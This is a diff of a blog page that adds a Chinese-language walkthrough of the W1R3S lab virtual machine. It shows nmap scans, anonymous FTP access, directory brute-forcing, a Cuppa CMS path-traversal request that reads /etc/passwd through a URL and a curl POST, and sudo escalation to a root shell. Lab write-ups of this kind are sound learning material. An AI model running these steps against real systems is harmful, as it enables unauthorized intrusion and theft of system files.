@@ -188,8 +188,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-03-16 09:15:57" itemprop="dateCreated datePublished" datetime="2023-03-16T09:15:57+08:00">2023-03-16</time>
+              <time title="创建时间：2023-03-16 09:15:57 / 修改时间：09:31:15" itemprop="dateCreated datePublished" datetime="2023-03-16T09:15:57+08:00">2023-03-16</time>
             </span>
 
           
@@ -203,7 +204,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
+<h3 id="nmap-扫服务"><a href="#nmap-扫服务" class="headerlink" title="nmap 扫服务"></a>nmap 扫服务</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png" alt="image-20230316092242512"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class="line">    PORT     STATE SERVICE VERSION</span><br><span class="line">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">    10123/tcp open  unknown</span><br><span class="line">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Linux 3.X|4.X|5.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class="line">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="访问ftp"><a href="#访问ftp" class="headerlink" title="访问ftp"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png" alt="image-20230316092603021"></p>
+<h3 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h3><h4 id="目录爆破：dirb、gobuster、feroxbuster"><a href="#目录爆破：dirb、gobuster、feroxbuster" class="headerlink" title="目录爆破：dirb、gobuster、feroxbuster"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a target="_blank" rel="noopener" href="http://192.168.1.28/administrator/installation/">http://192.168.1.28/administrator/installation/</a></p>
+<p>数据库创建失败</p>
+<p>开始看cms（cuppa）有漏洞没有</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">searchsploit  cuppa cms -m 25791  </span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>sudo 提权</p>
+<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png" alt="image-20230316093047508"></p>
+<p>成功</p>
+
       
     </div>
 
@@ -551,7 +574,7 @@
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
